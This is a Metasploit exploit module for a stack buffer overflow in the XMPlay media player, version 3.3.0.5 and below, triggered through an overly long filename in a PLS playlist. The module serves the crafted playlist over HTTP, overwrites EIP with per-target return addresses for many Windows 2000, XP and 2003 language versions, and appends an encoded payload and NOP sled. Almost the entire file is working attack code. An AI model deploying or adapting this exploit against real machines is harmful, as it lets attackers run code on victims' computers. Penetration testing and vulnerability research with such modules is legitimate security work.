require 'msf/core'

module Msf

class Exploits::Windows::Browser::Xmplay_pls < Msf::Exploit::Remote

	include Exploit::Remote::HttpServer::Html

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'XMPlay 3.3.0.5 <= (PLS Filename) Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack overflow in XMPlay 3.3.0.5 and lower.
				The vulnerability is caused due to a boundary error within
				the parsing of playlists containing an overly long file name or title.
				After overwriting EIP with our return address, ESP stores our exploit.
				This module uses the PLS file format and was based off of the ASX version
				by MC.  (WAX, ASX, PLS, and M3U are all vulnerable).
			},
			'License'        => MSF_LICENSE,
			'Author'        =>
				[
					'Greg Linares',	# initial discovery and original C exploits
					'MC', # wrote the original metasploit module
				],
			'Version'        => '$Revision: 1.3.0 $',
			'References'     =>
				[
					[ 'Email', 'GLinares.code@gmail.com'],
					[ 'URL', 'https://www.securinfos.info/english/security-advisories-alerts/20061121_XMPlay.M3U.Playlist.Parsing.Buffer.Overflow.Vulnerability.php'],
					[ 'URL', 'http://secunia.com/advisories/22999/' ],
					],

			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 750,
					'BadChars' => "\x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40",
					'EncoderType' => Msf::Encoder::Type::AlphanumUpper,
				},
			'Platform' => 'win',
			'Targets'  =>
				[
					[ 'Windows 2000 Pro English SP4', { 'Ret' => 0x77e14c29 } ],
					[ 'Windows XP Pro SP2 English', { 'Ret' => 0x77db41bc } ],
					[ 'Windows 2003 SP0 and SP1 English', { 'Ret' => 0x77d74adc } ],
					[ 'Windows XP Pro SP2 French', { 'Ret' => 0x77d8519f } ],
					[ 'Windows XP Pro SP2 German', { 'Ret' => 0x77d873a0 } ],
					[ 'Windows XP Pro SP2 Italian', { 'Ret' => 0x77d873a0 } ],
					[ 'Windows XP Pro SP2 Spainish', { 'Ret' => 0x77d9932f } ],
					[ 'Windows XP Pro SP2 Dutch', { 'Ret' => 0x77d873a0 } ],
					[ 'Windows XP Pro SP2 Polish', { 'Ret' => 0x77d873a0 } ],
					[ 'Windows 2000 Pro French SP4', { 'Ret' => 0x77e04c29 } ],
					[ 'Windows 2000 Pro Italian SP4', { 'Ret' => 0x77e04c29 } ],
					[ 'Windows 2000 Pro German SP4', { 'Ret' => 0x77e04c29 } ],
					[ 'Windows 2000 Pro Polish SP4', { 'Ret' => 0x77e04c29 } ],
					[ 'Windows 2000 Pro Dutch SP4', { 'Ret' => 0x77e04c29 } ],
					[ 'Windows 2000 Pro Spainish SP4', { 'Ret' => 0x77e04c29 } ],
					[ 'Windows 2000 Server French SP4', { 'Ret' => 0x77df4c29 } ],
					[ 'Windows 2000 Server Italian SP4', { 'Ret' => 0x77df4c29 } ],
					[ 'Windows 2000 Server Chineese SP4', { 'Ret' => 0x77df4c29 } ],

								],
			'Privileged'     => false,
			'DisclosureDate' => 'Nov 21 2006',
			'DefaultTarget'  => 1))
	end

	def autofilter
		false
	end
		def on_request_uri(client, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(client)) == nil)
			title 	=  Rex::Text.rand_text_alpha_upper(8)
		ext 	=  Rex::Text.rand_text_alpha_upper(3)
		drive	=  Rex::Text.rand_text_alpha_upper(1)

		sploit =  Rex::Text.rand_text_alpha_upper(505) + [ target.ret ].pack('V')
		sploit << payload.encoded + make_nops(20)

		# Build the PLS Exploit
		content =  "[playlist]\r\nNumberOfEntries=1\r\n" + "File1="
		content << "#{drive}:\\" + sploit + "#{ext}\r\n"
		content << "Title1=" + "#{title}" + "\r\n"
		content << "Length=1028\r\n"

		print_status("Sending exploit to #{client.peerhost}:#{client.peerport}...")

		# Transmit the response to the client
		send_response(client, content)
	end

end
end